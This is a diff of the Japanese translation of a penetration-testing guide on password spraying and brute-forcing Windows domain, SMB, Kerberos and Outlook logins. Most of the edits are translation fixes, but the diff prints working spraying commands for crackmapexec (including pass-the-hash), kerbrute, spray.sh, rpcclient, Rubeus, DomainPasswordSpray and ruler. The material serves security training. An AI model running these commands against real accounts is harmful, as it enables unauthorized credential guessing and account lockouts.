@@ -1,19 +1,19 @@
-# パスワードスプレー / ブルートフォース
+# パスワードスプレイ / ブルートフォース
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## **パスワードスプレー**
+## **パスワードスプレイ**
 
 いくつかの**有効なユーザー名**を見つけたら、発見した各ユーザーに対して最も**一般的なパスワード**を試すことができます（環境のパスワードポリシーを考慮してください）。\
 **デフォルト**では、**最小****パスワード****長**は**7**です。
 
 一般的なユーザー名のリストも役立つかもしれません: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-いくつかの間違ったパスワードを試すと、**アカウントがロックアウトされる可能性があることに注意してください**（デフォルトでは10回以上）。
+いくつかの間違ったパスワードを試すと**アカウントがロックアウトされる可能性がある**ことに注意してください（デフォルトでは10回以上）。
 
 ### パスワードポリシーを取得する
 
-ユーザーの資格情報やドメインユーザーとしてのシェルがある場合、**次のコマンドでパスワードポリシーを取得できます**:
+ユーザーの資格情報やドメインユーザーとしてのシェルがある場合は、**次のコマンドでパスワードポリシーを取得できます**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -39,34 +39,34 @@ crackmapexec smb <IP> -u users.txt -p passwords.txt
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 ```
-- [**kerbrute**](https://github.com/ropnop/kerbrute)（Go）を使用して
+- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) を使用して
 ```bash
 # Password Spraying
 ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**スプレー**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(ロックアウトを避けるために試行回数を指定できます):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（python）を使用 - 推奨されません。時々機能しません。
+- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute)（Python）を使用 - 推奨されません、時々機能しないことがあります
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- **Metasploit**の`scanner/smb/smb_login`モジュールを使用して:
+- `scanner/smb/smb_login` モジュールを使用して **Metasploit**:
 
 ![](<../../images/image (745).png>)
 
-- **rpcclient**を使用して:
+- **rpcclient** を使用して:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
 rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
 done
 ```
-#### Windowsから
+#### From Windows
 
 - [Rubeus](https://github.com/Zer1t0/Rubeus)のブルートモジュールを使用したバージョン:
 ```bash
@@ -76,8 +76,8 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
-```powershell
+- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) を使用すると（デフォルトでドメインからユーザーを生成し、ドメインからパスワードポリシーを取得し、それに応じて試行回数を制限します）：
+```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 - [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) を使用して
@@ -98,7 +98,7 @@ Outlookに対するp**assword spraying**のための複数のツールがあり�
 - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-これらのツールを使用するには、ユーザーリストとパスワード / 小さなパスワードリストが必要です。
+これらのツールを使用するには、ユーザーリストとパスワードまたは小さなパスワードリストが必要です。
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
